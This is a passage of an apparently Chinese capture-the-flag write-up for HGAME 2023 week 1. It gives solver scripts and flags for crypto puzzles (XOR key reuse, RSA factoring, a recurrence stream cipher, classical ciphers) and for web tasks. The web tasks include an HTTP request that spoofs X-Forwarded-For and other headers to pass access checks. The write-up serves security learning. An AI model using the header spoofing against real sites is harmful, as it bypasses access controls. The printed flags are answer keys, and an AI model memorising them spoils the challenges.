height))</span></span><br><span class="line"><span class="string">    x = 0</span></span><br><span class="line"><span class="string">    for i in range(height):</span></span><br><span class="line"><span class="string">        for j in range(width):</span></span><br><span class="line"><span class="string">            img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2]))</span></span><br><span class="line"><span class="string">            x += 3</span></span><br><span class="line"><span class="string">    return img</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(15):</span></span><br><span class="line"><span class="string">    im = makeImg()</span></span><br><span class="line"><span class="string">    im.save(f&quot;./source/picture&#123;i&#125;.png&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]</span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line">shuffle(index)</span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure></blockquote><p>15张随机明文图片 $P_{m_k},k \in [1,15]$ 与1张flag图片 $P_f$，经过3张密钥图片  $P_k,k \in [1,3]$ 随机异或得到密文图片 $P_{c_k}, k \in [1,16]$，在随机生成明文图片的 <code>makeImg()</code> 函数中有概率生成像素为 (0,0,0) 的点，这些点在随机异或操作后，密文图片与密钥图片对应的该点像素值相同，则有：</p><p>flag图片对应的密文图片：$P_{c_f}(x,y) = P_{f}(x,y) \oplus P_{k_a}(x,y)$</p><p>非flag随机明文图片对应的密文图片： $P_{c_i}(x,y) = P_{m_i}(x,y) \oplus P_{k_b}(x,y)$，</p><p>当满足 $a=b$ 时，即找到使用相同密钥图片加密的两组原始图片，有 $P_{k_a}(x,y)=P_{k_b}(x,y)$，</p><p>则 $P_{c_f}(x,y) \oplus P_{c_i}(x,y) = P_{f}(x,y) \oplus P_{m_i}(x,y)$；</p><p>又有大部分随机明文图片的点的像素值为 (0,0,0)，即 $P_{m_i}(x_0,y_0)=0$，则</p><p>$P_{c_f}(x_0,y_0) \oplus P_{c_i}(x_0,y_0) = P_{f}(x_0,y_0) \oplus P_{m_i}(x_0,y_0)=P_{f}(x_0,y_0)$</p><p>有很大概率可以恢复flag图片。</p><p>只需找到满足 $a=b$ 的使用相同密钥图片加密的两组原始图片即可，通过爆破遍历。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">width = <span class="number">379</span></span><br><span class="line">height = <span class="number">234</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        img1 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img2 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img = xorImg(img1, img2)</span><br><span class="line">        img.save(<span class="string">f&#x27;out/img_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到还原的flag图片，flag：<code>hgame&#123;Oh_my_Ticket&#125;</code>。</p><p>​    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>众所周知，RSA的安全性基于整数分解难题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$n$ 分解出 $p,q$，常规RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;factordb.com_is_strong!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Be-Stream"><a href="#Be-Stream" class="headerlink" title="Be Stream"></a>Be Stream</h3><blockquote><p>很喜欢李小龙先生的一句话”Be water my friend”，但是这条小溪的水好像太多了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">type</span>(flag) == <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (stream(i-<span class="number">2</span>)*<span class="number">7</span> + stream(i-<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>) % <span class="number">256</span></span><br><span class="line">    enc += <span class="built_in">bytes</span>([water ^ flag[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment"># b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>递推关系等同于矩阵运算：</p><p>$s_i=4s_{i-1}+7s_{i-2}\Longrightarrow \begin{bmatrix} s_i \\ s_{i-1}  \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}\begin{bmatrix} s_{i-1} \\ s_{i-2} \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}^{i-1}\begin{bmatrix} s_1 \\ s_0 \end{bmatrix}$</p><p>利用矩阵快速幂快速求值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">enc = <span class="built_in">list</span>(<span class="string">b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span>)</span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">s0, s1 = key</span><br><span class="line"></span><br><span class="line">M = matrix(Zmod(<span class="number">256</span>), [[<span class="number">4</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">0</span>]])</span><br><span class="line">A = vector(Zmod(<span class="number">256</span>), [s1,s0])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (M^(x-<span class="number">1</span>)*A)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>)</span><br><span class="line">    flag += [(<span class="built_in">int</span>(water) ^^ <span class="built_in">int</span>(enc[i])) % <span class="number">128</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;1f_this_ch@l|eng3_take_y0u_to0_long_time?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><blockquote><p>学校突然放假了，tr0uble正在开开心心的收拾东西准备回家，但是手机铃声突然响起，tr0uble接起电话，但是只听到滴答滴答的声音。努力学习密码学的tr0uble一听就知道这是什么，于是马上记录下来并花了亿点时间成功破译了，但是怎么看这都不像是人能看懂的，还没等tr0uble反应过来，又一通电话打来，依然是滴答滴答的声音。tr0uble想到兔兔也在学习密码学，于是不负责任地把密文都交给了兔兔，兔兔收到密文后随便看了一眼就不屑地说”这么简单都不会？自己解去，别耽误我抢车票”。</p><p>flag为最后得到的结果套上hgame{}, flag中字母均为小写</p></blockquote><p>txt文件中有提示：</p><p><code>几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。</code></p><p>从wav文件中手搓摩斯密码：</p><p><code>----- ..--- ..--- ...-- . ..--.- .--. .-. .. .. -... .-.. -.-- ..--.- ..--.- .... --- -. .-- .- ..--.- .--- -- --. .... ..--.- ..-. --. -.- -.-. --.- .- --- --.- - -- ..-. .-.</code></p><p>解码：<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>根据txt提示，字符串逆序 + 栅栏密码（18栏） 得到：<code>rmocfhm_wo_ybipe2023_ril_hnajg_katfqqg</code></p><p>由 <code>2023</code> 猜测 <code>ybipe</code> 对应 <code>hgame</code>，尝试Vigenere密码，密钥 <code>vidar</code>，得到：<code>welcome_to_hgame2023_and_enjoy_hacking</code></p><p>flag：<code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><blockquote><p>兔兔最近迷上了一个纯前端实现的网页小游戏，但是好像有点难玩，快帮兔兔通关游戏！</p></blockquote><p>js游戏，查看源码，在 <code>/Res/Events.js</code> 中找到关键函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mota</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = [<span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span>];</span><br><span class="line">  (<span class="keyword">function</span> (<span class="params">b, e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params">g</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (--g) &#123;</span><br><span class="line">        b[<span class="string">&#x27;push&#x27;</span>](b[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">f</span>(++e);</span><br><span class="line">  &#125;(a, <span class="number">0x198</span>));</span><br><span class="line">  <span class="keyword">var</span> b = <span class="keyword">function</span> (<span class="params">c, d</span>) &#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">&#x27;CFrzVf&#x27;</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> g;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> i = <span class="title class_">Function</span>(<span class="string">&#x27;return\x20(function()\x20&#x27;</span> + <span class="string">&#x27;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&#x27;</span> + <span class="string">&#x27;);&#x27;</span>);</span><br><span class="line">          g = <span class="title function_">i</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (j) &#123;</span><br><span class="line">          g = <span class="variable language_">window</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;</span><br><span class="line">        g[<span class="string">&#x27;atob&#x27;</span>] || (g[<span class="string">&#x27;atob&#x27;</span>] = <span class="keyword">function</span> (<span class="params">k</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> l = <span class="title class_">String</span>(k)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          <span class="keyword">var</span> m = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0x0</span>, o, p, q = <span class="number">0x0</span>; p = l[<span class="string">&#x27;charAt&#x27;</span>](q++); ~p &amp;&amp; (o = n % <span class="number">0x4</span> ? o * <span class="number">0x40</span> + p : p, n++ % <span class="number">0x4</span>) ? m += <span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span> &amp; o &gt;&gt; (-<span class="number">0x2</span> * n &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">            p = h[<span class="string">&#x27;indexOf&#x27;</span>](p);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> m;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;());</span><br><span class="line">      b[<span class="string">&#x27;fqlkGn&#x27;</span>] = <span class="keyword">function</span> (<span class="params">g</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="title function_">atob</span>(g);</span><br><span class="line">        <span class="keyword">var</span> j = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0x0</span>, l = h[<span class="string">&#x27;length&#x27;</span>]; k &lt; l; k++) &#123;</span><br><span class="line">          j += <span class="string">&#x27;%&#x27;</span> + (<span class="string">&#x27;00&#x27;</span> + h[<span class="string">&#x27;charCodeAt&#x27;</span>](k)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(j);</span><br><span class="line">      &#125;;</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>] = &#123;&#125;;</span><br><span class="line">      b[<span class="string">&#x27;CFrzVf&#x27;</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> f = b[<span class="string">&#x27;iBPtNo&#x27;</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (f === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      e = b[<span class="string">&#x27;fqlkGn&#x27;</span>](e);</span><br><span class="line">      b[<span class="string">&#x27;iBPtNo&#x27;</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      e = f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="title function_">atob</span>(<span class="title function_">b</span>(<span class="string">&#x27;\x30\x78\x30&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在控制台中运行，弹窗内容即为flag：<code>hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</code>。</p><p>​    </p><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><blockquote><p>学校通知放寒假啦，兔兔兴高采烈的打算购买回家的车票，这时兔兔发现成为购票网站的会员账户可以省下一笔money……</p><p>想成为会员也很简单，只需要一点点HTTP的知识……等下，HTTP是什么，可以吃吗</p></blockquote><p>考察HTTP请求头中的User-Agent、Cookie、来源(Referer)和本地访问(X-Forwarded-For)。</p><p>需依次满足：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">JSON</span><br><span class="line">username=luckytoday</span><br><span class="line">password=happy123</span><br></pre></td></tr></table></figure><p>以JSON格式请求登录即可：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:31450</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Cute-Bunny</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bunnybunnybunny.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>code=Vidar</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;luckytoday&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;happy123&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>返回flag值：<code>hgame&#123;H0w_ArE_Y0u_T0day?&#125;</code>。</p><p>​    </p><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><blockquote><p>刚加入Vidar的兔兔还认不清协会成员诶，学长要求的答对100次问题可太难了，你能帮兔兔写个脚本答题吗？</p></blockquote><p>查看源码：</p><p><code>&lt;!-- Hint: https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js --&gt;</code></p><p>访问发现为页面问题的答案，以list方式提取数据。</p><p>另在js文件中搜索发现页面的3个路由：</p><p>获取问题：<code>/api/getQuestion</code>，验证答案：<code>/api/verifyAnswer</code>，获取分数：<code>/api/getScore</code>。</p><p>python脚本模拟页面100次回答：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;ba1van4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;intro&quot;</span>: <span class="string">&quot;21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉&quot;</span>,</span><br><span class="line">        <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;</span>,</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ba1van4.icu&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ......</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> data:</span><br><span class="line">    dic[k[<span class="string">&quot;intro&quot;</span>]] = k[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:xxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    r = 